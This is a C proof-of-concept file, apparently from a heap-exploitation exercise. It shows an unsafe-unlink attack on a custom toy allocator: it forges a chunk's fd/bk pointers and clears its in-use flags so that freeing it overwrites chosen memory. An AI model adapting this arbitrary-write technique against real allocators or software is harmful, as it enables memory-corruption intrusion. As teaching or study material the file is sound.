#include "../heap/heap.h"
#include <stddef.h>

/* converts a memory from a chunk address to the start of the chunk address */
#define mem2chunk(mem) (offsetptrbk(mem, sizeof(hchunk), void))

/* converts a start-of-the-chunk address to memory of the chunk address */
#define chunk2mem(chunk) (offsetptrfd(chunk, sizeof(hchunk), void))

int main(void)
{
    /*
        binlist_unlink(ptr) { 
            if(ptr->fd != NULL) 
            { 
                ptr->fd->bk = ptr->bk; 
            } 
            if(ptr->bk != NULL) 
            { 
                ptr->bk->fd = ptr->fd; 
            }
        }

    ptr->bk->fd = ptr->fd
    ptr->bk + offsetof(fd) = ptr->fd
    ptr->bk = ptr->fd - offsetof(hchunk, fd)

    Arbitrary write :
    dst - offsetof(hchunk, fd) : ptr->bk 
    src : ptr->fd 
    
    */
    printf("size of hchunk : %lu\n", sizeof(hchunk));

    size_t def = 0;

    char b1[50];
    size_t* changeme = &def;

    char b2[50];
    size_t other = 1337;

    char b3[50];

    void* ptr1 = halloc(32);
    hchunk* chunk1 = (hchunk*)mem2chunk(ptr1);

    void* ptr2 = halloc(32);
    hchunk* chunk2 = (hchunk*)mem2chunk(ptr2);

    
    printf("Before exploit : \n");
    printf("changeme@%p : %p *= %lx\n", &changeme, (void*)changeme, *changeme);
    printf("other@%p %p\n", &other, (void*)other);
    
    
    modify_chunk_prev_used_flag(*chunk1, 0);
    chunk1->prev_size = 0; // consolidate with itself

    size_t bkoff = (size_t)offsetof(hchunk, bk);
    size_t fdoff = (size_t)offsetof(hchunk, fd);

    printf("hchunk->fd offset : %lu\n", fdoff);
    printf("hchunk->bk offset : %lu\n", bkoff);

    modify_chunk_used_flag(*chunk2, 0);
    /* will write chunk2->bk = &other in changeme*/
    chunk2->fd = (void*)((size_t)&changeme - bkoff);
    /* will write chunk2->fd = &changeme - bkoff in other + fdoff = other + 32*/
    chunk2->bk = (void*)&other;

    
    hfree(ptr1);
    
    printf("After exploit : \n");
    printf("changeme@%p : %p *= %lx\n", &changeme, (void*)changeme, *changeme);
    printf("other@%p %p\n", &other, (void*)other);
    

    hcleanup();
}